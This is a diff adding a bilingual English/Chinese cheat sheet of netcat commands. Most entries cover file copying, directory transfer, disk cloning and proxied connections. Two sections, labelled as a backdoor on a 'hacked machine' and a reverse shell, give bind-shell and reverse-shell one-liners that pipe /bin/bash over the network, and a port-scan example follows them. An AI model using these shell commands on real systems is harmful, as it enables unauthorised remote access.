@@ -1,0 +1,72 @@
+1) Copying Files using the Netcat Command in Linux
+  On the listening machine (destination):
+  $ nc -l 8080 > file.txt
+
+  On the sending machine (source):
+  $ nc 192.168.1.100 8080 < data.txt
+
+2) 目录传输(用bzip2压缩)
+  方式一(目录源机器作为客户端):
+  On client (source machine, host1)
+  $ tar -cvf – dir_name | bzip2 -z | nc host2 1567
+  On server (destination machine, host2)
+  $ nc -l 1567 | bzip2 -d | tar -xvf -
+
+  方式二(目录源机器作为服务端):
+  On server (source machine, host1)
+  $ tar -cvf – dir_name | bzip2 -z | nc -l 1567
+  On client (destination machine, host2)
+  $ nc -n host1 1567 | bzip2 -d | tar -xvf -
+
+3) 加密你通过网络发送的数据
+  On client (source machine, host1)
+  $ mcrypt –flush –bare -F -q -m ecb < file.txt | nc host2 1567
+
+  On server (destination machine, host2)
+  $ nc -l 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
+
+4) 克隆一个磁盘分区
+  方式一(源机器作为客户端):
+  Server (source, host1)
+  $ dd if=/dev/sda | nc -l 1567
+  Client (destination, host2)
+  $ nc -n 172.31.100.7 1567 | dd of=/dev/sda
+
+  方式二(源机器作为服务端):
+  Client (source, host1)
+  $ dd if=/dev/sda | nc host2 1567
+  Server (destination, host2)
+  $ nc -l 1567 | dd of=/dev/sda
+
+3) Using Netcat to create a system backdoor
+  On hacked machine (backdoor process):
+  $ nc -l 5500 -e /bin/bash
+  Or if nc does not support -e option:
+  $ mkfifo /tmp/tmp_fifo
+  $ cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 5500 > /tmp/tmp_fifo
+
+  On hacker machine (to connect a remote shell):
+  $ nc 10.10.10.100 5500
+
+4) Reverse shell
+  On hacker machine (host1, got a remote shell of host2):
+  $ nc -l 5500
+
+  On hacked machine (host2, backdoor process):
+  $ nc host1 5500 -e /bin/bash
+
+4) Port Scanning (netcat-openbsd)
+  $ nc.openbsd -v -z host.example.com 20-30
+  Connection to host.example.com 22 port [tcp/ssh] succeeded!
+  Connection to host.example.com 25 port [tcp/smtp] succeeded!
+
+5) Open a UDP connection to port 53 of host.example.com:
+  $ nc -u host.example.com 53
+
+6) Create and listen on a UNIX-domain stream socket:
+  $ nc.openbsd -lU /var/tmp/dsocket
+
+7) Connect to port 42 of host.example.com via an HTTP proxy at 10.2.3.4, port 8080.
+  $ nc -x10.2.3.4:8080 -Xconnect host.example.com 42
+
+NOTE: the default package of netcat is netcat-nmap(ncat)
